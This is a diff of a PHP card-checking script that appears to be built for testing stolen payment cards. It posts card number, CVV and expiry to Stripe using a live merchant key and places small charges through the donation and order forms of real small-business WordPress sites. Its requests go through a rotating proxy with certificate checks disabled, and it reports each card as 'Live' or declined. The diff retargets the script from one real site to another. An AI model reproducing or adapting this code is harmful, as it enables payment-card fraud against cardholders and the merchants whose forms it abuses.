@@ -82,7 +82,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=ca1e6427-8abe-4e16-a4d5-309b9a13da71c4b585&sid=482a60bf-5af2-45a4-a914-d63875ee91bf727474&pasted_fields=number&payment_user_agent=stripe.js%2F327b5a4b1f%3B+stripe-js-v3%2F327b5a4b1f%3B+card-element&referrer=https%3A%2F%2Famenaustralia.org&time_on_page=282412&key=pk_live_51N1T9rEYhF4M0Q0zIpXEA9YgCXPJbyznNF0qzlcBzyv7Ib0hHFdxT88yoJ5zJa3Nn6e9V2Zs3RbXAzb5HZH2aA9E00RMJu6ufy');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=043756e9-e85e-474e-bafc-ec8b90b5b100f6fb78&sid=02596579-0653-4ffe-b811-f136932ade5c1e75c2&pasted_fields=number&payment_user_agent=stripe.js%2F569a682bb6%3B+stripe-js-v3%2F569a682bb6%3B+card-element&referrer=https%3A%2F%2Fwww.simplycleandiaperservice.com&time_on_page=37106&key=pk_live_51LK6MYJNk2Vsl6q9R5uaoX8mKsC2vSopWsgjOMDhkOnn0DqmCKlWoGWm82xtw2f8B2eHFzVrqQ2sxMb4Wu74S92p00ORc8AZSz');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -95,7 +95,7 @@ $PROXYSCRAPE_PORT = 6060;
 $PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://amenaustralia.org/wp-admin/admin-ajax.php?t=1713142681576');
+curl_setopt($ch, CURLOPT_URL, 'https://www.simplycleandiaperservice.com/wp-admin/admin-ajax.php?t=1713311527515');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
@@ -110,22 +110,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1713142681576 h2',
-'Host: amenaustralia.org',
+'POST /wp-admin/admin-ajax.php?t=1713311527515 h2',
+'Host: www.simplycleandiaperservice.com',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://amenaustralia.org',
+'origin: https://www.simplycleandiaperservice.com',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://amenaustralia.org/membership-registration/',
+'referer: https://www.simplycleandiaperservice.com/one-time-service/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1656%26_fluentform_5_fluentformnonce%3Daf63650288%26_wp_http_referer%3D%252Fmembership-registration%252F%26name_1%255Bfirst_1_3%255D%3DGloo%26name_1%255Blast_1_6%255D%3DSmoke%26email_2%3D'.$id.'%2540gmail.com%26user_role%3Dretired%26input_text%3D'.$id.'%26password%3DGloo%2540123%26name_8%255Bfirst_8_3%255D%3D%26name_8%255Bmiddle_8_4%255D%3D%26name_8%255Blast_8_6%255D%3D%26address_9%255Bstreet_address_9_1%255D%3D%26address_9%255Baddress_line_2_9_2%255D%3D%26address_9%255Bcity_9_3%255D%3D%26address_9%255Bstate_province_9_4%255D%3D%26address_9%255Bzip_postal_code_9_5%255D%3D%26address_9%255Bcountry_9_6%255D%3D%26payment_input_3%3D0%26payment_method%3Dstripe%26__entry_intermediate_hash%3De4d356b380d6414ada8a3804d7767c0f%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=5');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D5479%26_fluentform_12_fluentformnonce%3D11272bbeb5%26_wp_http_referer%3D%252Fone-time-service%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26phone%3D%26payment_input_1%255B%255D%3D12%2520cents%2520per%2520piece%2520(All-in-Ones%2520count%2520as%25202%2520pieces)%26how_many_diapers%3D4%26custom-payment-amount%3D0.04344%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=12');
 
 $result2a = curl_exec($ch);
 
@@ -197,7 +197,7 @@ $response = "Expired Card 🚫";
   }
 
 
-elseif (strpos($result2a, 'Thank you for registering!')){
+elseif (strpos($result2a, 'Thank you for your order')){
   $status = "Live 🟢";
 $response = "Charged 1$ ✅";
 
